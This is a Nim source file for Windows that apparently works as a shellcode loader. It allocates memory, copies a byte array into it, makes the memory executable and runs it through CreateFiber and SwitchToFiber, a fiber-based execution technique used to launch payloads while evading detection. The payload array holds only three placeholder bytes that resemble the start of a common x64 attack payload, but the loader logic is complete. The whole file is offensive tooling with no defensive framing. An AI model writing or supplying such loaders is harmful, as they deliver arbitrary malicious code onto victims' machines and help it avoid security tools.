
import winim/lean, strutils




func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))





proc injectShellcode(shellcode: seq[byte]) =
    let size = shellcode.len
    
    # Allocate RW memory
    let memAddr = VirtualAlloc(
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if memAddr == nil:
        echo "[-] VirtualAlloc failed"
        quit(1)
    
    # Copy shellcode to allocated memory
    copyMem(
        memAddr,
        unsafeAddr shellcode[0],
        size
    )
    
    # Change protection to RX
    var oldProtection: DWORD
    let protectSuccess = VirtualProtect(memAddr, SIZE_T(size), PAGE_EXECUTE_READ, addr oldProtection)
    
    if protectSuccess == 0:
        echo "[-] VirtualProtect failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    # Convert current thread to fiber
    let mainFiber = ConvertThreadToFiber(nil)
    if mainFiber == nil:
        echo "[-] ConvertThreadToFiber failed"
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    # Create fiber pointing to shellcode
    let hFiber = CreateFiber(
        0,
        cast[LPFIBER_START_ROUTINE](memAddr),
        nil
    )
    
    if hFiber == nil:
        echo "[-] CreateFiber failed"
        discard ConvertFiberToThread()
        discard VirtualFree(memAddr, 0, MEM_RELEASE)
        quit(1)
    
    echo "[+] Executing shellcode via Fiber..."
    SwitchToFiber(hFiber)
    
    # Cleanup
    DeleteFiber(hFiber)
    discard ConvertFiberToThread()
    discard VirtualFree(memAddr, 0, MEM_RELEASE)


var shellcode: array[3, byte] = [0xfc,0x48,0x83]

proc main() =

    # Convert array to seq for easier handling
    var shellcodeByte = @shellcode
    var finalShellcode = shellcodeByte
    injectShellcode(finalShellcode)


main()
